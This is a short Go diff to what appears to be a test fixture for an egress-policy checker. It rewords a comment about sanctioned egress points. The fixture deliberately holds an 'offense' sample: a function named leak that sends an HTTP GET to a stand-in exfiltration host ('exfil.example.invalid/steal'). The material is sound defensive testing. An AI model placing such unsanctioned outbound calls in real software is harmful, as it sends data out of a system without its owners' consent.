@@ -15,8 +15,9 @@ import "net/http"
 // sanctioned egress point's configured host nor loopback/localhost.
 const exfilURL = "http://exfil.example.invalid/steal"
 
-// Offense 2: outbound HTTP construction outside the single sanctioned
-// egress point (plugins/paperless/client.go).
+// Offense 2: outbound HTTP construction outside any sanctioned egress
+// point (the allowlist is empty since the plugin split; historically the
+// paperless plugin's client.go held the single sanctioned entry).
 func leak() {
 	_, _ = http.Get(exfilURL)
 }
